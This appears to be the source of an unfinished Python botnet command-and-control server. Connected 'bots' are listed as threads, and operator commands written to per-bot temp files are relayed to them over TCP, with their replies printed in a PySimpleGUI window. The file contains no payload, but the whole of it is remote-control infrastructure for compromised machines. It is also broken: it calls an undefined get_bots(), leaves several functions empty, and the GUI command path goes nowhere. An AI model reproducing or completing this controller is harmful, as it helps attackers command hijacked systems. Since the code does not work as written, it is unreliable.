import threading
import socketserver
import PySimpleGUI as sg #note you have to pip install pysimpleGUI
from os.path import exists

class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
	def handle(self):
	
		client_ip = self.client_address[0]
	
		#Gets the connection data
		data = str(self.request.recv(1024), 'ascii')
		self.cur_thread = threading.current_thread()
		#response = bytes("{}: {}".format(cur_thread.name, data), 'ascii')
		#self.request.sendall(response)
		
		
		thread_num = self.cur_thread.name.split("-")[-1]
		client_ip = self.client_address[0]
		
		print("Client IP address ", client_ip, "Thread Number: ", thread_num)
		
		
		if (not exists("./tmpfiles/" + thread_num + ".txt")):
			f = open("tmpfiles/" + thread_num + ".txt", "x")
			f.close()
		while True:
			with open("tmpfiles/" + thread_num + ".txt", 'r+') as file:
				
			#Now, let's figure out how to get it to send commands instead!
				command = file.readline()
				if command:
					self.sendCommand(command)
					file.truncate(0)

	#Handles sending the command to the bot
	# Takes in a command string, and will send it, wait for a response, and then print the response. 
	def sendCommand(self, cmd):
		self.request.sendall(cmd.encode()) #Sends the message over to the bot
		message = self.request.recv(1024).strip().decode() #... and receives the response
		response = bytes("{}: {}".format(self.cur_thread.name, message), 'ascii').decode()
		print(response)



class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
	pass
	
def threads_check(threads):
	for thread in threads:
		name = thread.name
		#base = name.split("-")
		#base = base[0]
		#if base is "Thread":
		#	thread.shutdown()   ## FIXME not actually stoping the thread
		#print(name)

	
if __name__ == "__main__":
	# Port 0 means to select an arbitrary unused port
	HOST, PORT = "", 8000
	

	server = ThreadedTCPServer((HOST, PORT), ThreadedTCPRequestHandler)
	
	#Fixes a bug where closing and reopening the server too quickly
	# gives a "port already in use" error

	socketserver.TCPServer.allow_reuse_address = True


	with server:
		ip, port = server.server_address
		print("here")
		# Start a thread with the server -- that thread will then start one
		# more thread for each request
		server_thread = threading.Thread(target=server.serve_forever)

		# Exit the server thread when the main thread terminates
		server_thread.daemon = True
		server_thread.start()
		print("Server loop running in thread:", server_thread.name)

		#Returns a list of bots.
		# We make this return a list so that we can wrap the bots themselves in buttons,
		# lists, or radio button setups, instead of being restricted to one.
		# However, this does mean that we'll have to handle them separately...
		def get_bot_list():
			threads = threading.enumerate()
			print(threads)
			botList = []
			threads = threads[2:] #Removes the main and server threads, leaving only bot threads
			if threads: #Checks if there are any bots connected.
				for thread in threads:
					name = thread.name
									
					botList.append(name)
			else:
				return 0
			return botList
		
		#def thread_info(thread):
			
		
		def process_bot_selection(w):
			event, values = w.read()
			
			
		#Takes in a list and returns a list of lists of button objects
		def make_button(lst):
			out = []
			for l in lst:
				out.append([sg.Button(l)])
			return out
			
		
		
		#Trying menu stuff!
		
		layout = [[sg.Text("Bot Test...")],
		 [sg.Button("Click to see the bots...")],
		 [sg.Text("... or enter a command!"), sg.InputText(), sg.Button("Ok")]]
		
		window = sg.Window("Bot", layout)
		

		while True:
			
			# BELOW is meant to check the threads 
			#threads = threading.enumerate()
			#print(threading.activeCount())
			#threads_check(threads)
			event, values = window.read()
			if event == sg.WIN_CLOSED:
				break
			elif event == "Click to see the bots...":
				bots = get_bots()
				if bots:
					#Makes the output into buttons
					botWindow = sg.Window("Bots", make_button(bots))
				else:
					botWindow = sg.Window("Bots", [[sg.Text("No bots connected...")]])
				process_bot_selection(botWindow)
			elif event == "Ok":
				command = values[0]
				print(command)
				#cmdWindow = sg.Window("Select Bots", [])
			
			'''
			command = input("enter a command:\n")
			print(command)
			bots = input("which bots should run this? ").split(",")
			print(bots)
			for bot in bots:
				with open("tmpfiles/" + bot.strip() + ".txt", 'w') as file:
					print("Writing", command)
					file.write(command)
			'''
	window.close()
	server.shutdown()
